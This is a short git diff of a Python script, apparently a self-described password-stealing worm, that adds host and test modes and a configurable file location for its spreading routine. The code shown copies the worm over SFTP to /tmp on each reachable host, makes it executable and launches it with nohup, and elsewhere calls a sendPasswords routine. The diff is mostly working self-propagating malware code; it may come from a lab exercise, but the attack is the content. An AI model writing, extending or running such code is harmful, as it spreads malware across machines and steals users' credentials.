@@ -131,9 +131,16 @@ def sendPasswords():
 
 markSystem();
 
-if len(sys.argv) == 2:
+wormLocation = "/tmp/password_worm.py"
+
+if len(sys.argv) >= 2:
 	if sys.argv[1] == "-host":
-		print("Will mark and spread worm but won't steal its own password!")
+		print("This is the host computer will not steal passwords from this computer!")
+		wormLocation = "password_worm.py"
+	elif sys.argv[1] == "-t":
+		print("Testing spreading with this IP: %s" %(str(argv[2])))
+		wormLocation = "password_worm.py"
+		network = [argv[2]]
 else:
 	sendPasswords()
 
@@ -155,7 +162,7 @@ for Host in network:
 			print("Spreading to this machine: %s" %(str(Host)))
 			try:
 				sftpClient = sshInfo[0].open_sftp()
-				sftpClient.put("password_worm.py", "/tmp/" + "password_worm.py")
+				sftpClient.put(wormLocation, "/tmp/" + "password_worm.py")
 				sshInfo[0].exec_command("chmod a+x /tmp/password_worm.py")
 				sshInfo[0].exec_command("nohup python /tmp/password_worm.py &")
 			except:
